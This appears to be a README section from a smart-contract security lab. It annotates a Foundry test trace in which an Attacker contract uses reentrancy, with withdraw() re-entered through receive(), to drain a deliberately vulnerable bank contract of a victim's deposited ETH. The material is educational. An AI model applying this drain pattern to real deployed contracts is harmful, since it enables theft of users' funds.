## Let's start explaining callstack
The screenshots resolution is very low if viewed directly through github. I recommend opening the image in a new tab and reading the comments at the same time.
![Screenshot 2025-03-22 at 20 51 46](https://github.com/user-attachments/assets/5112a46d-acde-439d-adb7-0efefa2046ea)
![Screenshot 2025-03-22 at 20 52 04](https://github.com/user-attachments/assets/2a2092c0-35c1-4d1d-bbe9-7706cf5a26e1)


We launched the test with the -vvvv flag, which provides full log details. In the square brackets before each action is executed, you can see how much gas was consumed.

```text
[263479] ReentrancyTest::testReentrancy() – Launching our test.
```
You may notice that with each reentrancy transaction, the amount of gas spent decreases.
This happens because each subsequent function call becomes shorter and easier for the EVM.
Each new call goes deeper into the call stack, where part of the data has already been processed, some variables are not re-created, and functions often work with values that are already prepared.
```text
[22537] VM::startPrank(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) – Starting actions as the victim.
```
```text
VBank::deposit{value: 10000000000000000000}() – The victim deposits 10 ETH (in wei) into the bank.
After each completed function, you see [stop].


```VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])```
   └─ ← [Return]
```

    ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Return]
       - First we check the hacker’s balance with assertEq. The values match, confirming the hacker truly has 10 ETH.


    ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19]) [staticcall]
       - Same balance check for the vulnerable bank. 

```text
[127058] Attacker::attack{value: 1000000000000000000}()
    │   ├─ [22537] VBank::deposit{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
```
We are launching our attack. Inside it, deposit() is triggered first, followed by receive() with an embedded withdraw() call. This clearly demonstrates the reentrancy attack: the withdrawal is repeated 10 times. 

Because the hacker's balance in the vulnerable contract's mapping is recorded as 1 ETH at a time, we can't withdraw more than 1 ETH in one go. However, since we can withdraw funds before the balance is reset to zero, we can keep withdrawing 1 ETH repeatedly until the vulnerable contract is fully drained.
```text
[0] owner::fallback{value: 11000000000000000000}() — The hacker’s fallback function was called, receiving 11 ETH.
```
```text
VM::assertGt(20000000000000000000 [2e19], 10000000000000000000 [1e19]) [staticcall] — Here we see the attacker’s
 balance is now 20 ETH instead of 10 ETH, meaning the owner address took funds from Alice’s address,
 which had stored money in the contract.
 This is direct evidence of the contract being hacked.
```
```text
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.38ms (429.33µs CPU time)
Ran 1 test suite in 353.88ms (1.38ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
Suite result: ok. — The test run completed successfully.
1 passed — One test was executed, and it passed.
0 failed — No errors were found.
0 skipped — No tests were skipped.
